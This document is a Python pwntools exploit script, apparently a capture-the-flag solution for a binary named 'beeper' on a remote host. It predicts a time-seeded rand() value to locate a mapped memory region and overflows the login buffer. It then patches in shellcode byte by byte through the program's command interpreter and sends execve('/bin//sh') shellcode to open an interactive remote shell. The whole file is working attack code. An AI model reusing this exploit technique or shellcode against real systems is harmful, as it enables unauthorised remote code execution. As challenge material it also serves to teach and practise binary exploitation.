from pwn import *
import ctypes

def do_login(passwd):
    p.recvuntil('password:')
    p.sendline(passwd)


elf = ELF('./beeper')
libc = ctypes.cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')
libc.srand(libc.time(0))

#p = process(elf.file.name)
#p = remote('47.98.57.19', 23333)
p = remote("47.91.210.30", "23333")
exp = ''
exp += "BokuWaDokoNiIruNo?\x00"
exp += "A"*85
r = libc.rand()
exp += p64((((r + 16) << 12) + (((r + 16) << 12) >= 0xFFFFFFFF))&0xfffff000)
exp += "\x00" # rule set here
map_area = ((r + 16) << 12) + (((r + 16) << 12) >= 0xFFFFFFFF)&0xfffff000
print hex(map_area)
do_login(exp)

#p.sendline('\x86\x13\x81\x09\x62\xff\x44\xd3\x3f\xcd\x19\xb0\xfb\x88\xfd\xae\x20\xdf\x00')
#p.recvuntil('choice>>')
#### login Done! ####

sc = "\x48\x89\xC6\x48\xC7\xC7\x00\x00\x00\x00\x48\xC7\xC2\x00\x03\x00\x00\x48\x31\xC0\x0F\x05\x90\x90"
org = '\x68\x6f\x64\x20\x01\x81\x34\x24\x01\x01\x01\x01\x48\xb8\x75\x79\x20\x61\x20\x70\x68\x6f\x50\x48\xb8\x61\x6e'


#raw_input('break')
for i in range(len(sc)):
    tmp = '\x85\x13\x81\x09\x62\xff\x44\xd3\x3f\xcd\x19\xb0\xfb\x88\xfd\xae\x20\xdf\x00'
    tmp += "A"*85
    tmp += p64(map_area)
    tmp += 'h'*i
    if(ord(sc[i])-ord(org[i]) < 0):
        tmp += 'u'*(ord(org[i])-ord(sc[i]))
    else:
        tmp += 'm'*(ord(sc[i])-ord(org[i]))
    print tmp
    tmp += '\x00'
    p.sendline(tmp)
    time.sleep(0.1)
    p.recv()

p.sendline('\x86\x13\x81\x09\x62\xff\x44\xd3\x3f\xcd\x19\xb0\xfb\x88\xfd\xae\x20\xdf\x00')
p.recv()
p.sendline('3')
time.sleep(1)
p.sendline('\x90'*200+'\x48\x31\xC0\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05')
p.interactive()
